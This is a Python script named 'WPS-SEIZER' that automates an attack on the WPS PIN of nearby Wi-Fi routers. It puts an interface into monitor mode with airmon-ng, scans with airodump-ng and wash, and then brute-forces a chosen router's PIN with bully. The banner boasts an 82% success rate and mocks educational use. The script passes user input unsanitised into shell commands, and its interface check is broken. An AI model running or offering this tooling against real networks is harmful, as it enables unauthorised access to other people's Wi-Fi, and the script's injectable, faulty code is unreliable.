import os
import time
try:
	import netifaces
	import sys
	from colorama import init, Fore, Back, Style
except ImportError as ie:
	print(ie)
	time.sleep(4)
	os.system("sudo apt-get update")
	os.system("sudo apt-get install libpcap-dev")
	os.system("sudo apt-get install sqlite3")
	os.system("sudo apt-get install libsqlite3-dev")
	os.system("sudo apt-get install pixiewps")

print(Style.BRIGHT + "")

print(Fore.CYAN + """

		-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
		#			WPS-SEIZER		      #
	     =-=#-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#=-=-
	     #LOOK FOR 'PIN FOUND: ' IN TERMINAL TO HAVE ROUTER'S WPS PIN-=#
	     =-#-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
	     =-#-IT HAS 82% CHANCE TO GET THE WPS PIN OF WPS ENABLE ROUTERS#
	     =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
	     #		DONT USE IT FOR EDUCATIONAL PURPOSES!!!!	   #
	     ###############################################################
""")

try:
	print(Fore.CYAN + ">> [*] Script Initializing.....")
	time.sleep(3)
	print(Fore.GREEN + ">> [+] Script Initialized Successfully!")
	time.sleep(2)
	interfaces = netifaces.interfaces()
	for interface in interfaces:
		print(Fore.CYAN + ">> [+] Interface: " + str(interface))
	uiface = input(Fore.GREEN + ">> [?] Enter Desired Interface: ")
	if(len(uiface) == 0 or interface not in interface):
		print(Fore.RED + ">> [!] No Interface Has Not Been Inserted Or It Is Invalid")
		time.sleep(2)
		sys.exit()
	else:
		os.system("sudo airmon-ng start " + str(uiface))
		os.system("clear")
		if(uiface.endswith('mon') == False):
			print(Fore.CYAN + "[!] Restarting Script To Put Interface In Monitor Mode. It is Completely Normal! Dont FUcking Panic!")
			time.sleep(4)
			os.system("python3 wifiseizer.py")
		else:
			print(Fore.GREEN + ">> [*] Hit Ctrl C After 5 Seconds Of Scanning!")
			time.sleep(2)
			os.system("sudo airodump-ng {0}".format(uiface))
			time.sleep(1)
			os.system("clear")
			print(Fore.CYAN + ">> [*] Scanning For Wps Enabled Wifi Networks....")
			print(Fore.GREEN + ">> [*] Hit Ctrl When You See The Target Network!")
			time.sleep(3)
			os.system("sudo wash -i " + str(uiface))
			channel = input(Fore.GREEN + ">> [?] Enter Network Channel: ")
			bssid = input(Fore.GREEN + ">> [?] Enter Network BSSID(Mac Address): ")
			os.system("sudo bully -b "+bssid+" -c "+channel+" -d "+uiface)
except KeyboardInterrupt as ki:
	print(Fore.RED + ">> [-] Exiting......")
	time.sleep(2)
	sys.exit()
